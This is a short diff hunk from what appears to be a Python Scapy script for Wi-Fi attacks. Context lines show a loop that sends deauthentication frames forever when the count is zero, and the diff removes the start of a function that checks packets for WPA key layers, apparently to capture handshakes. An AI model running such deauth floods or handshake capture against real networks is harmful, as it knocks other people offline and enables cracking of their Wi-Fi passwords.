@@ -19,9 +19,3 @@ for i in range(int(count)):
 if int(count)==0:
     while True:
         sendp(deauth, iface=iface)
-
-def getHandshake(pkt):
-    #We check if the packet is a WPA packet
-    if pkt.hasLayer(WPA_KEY):
-        #Get the layer with the WPA information
-        layer = pkt.getLayer(WPA_KEY)
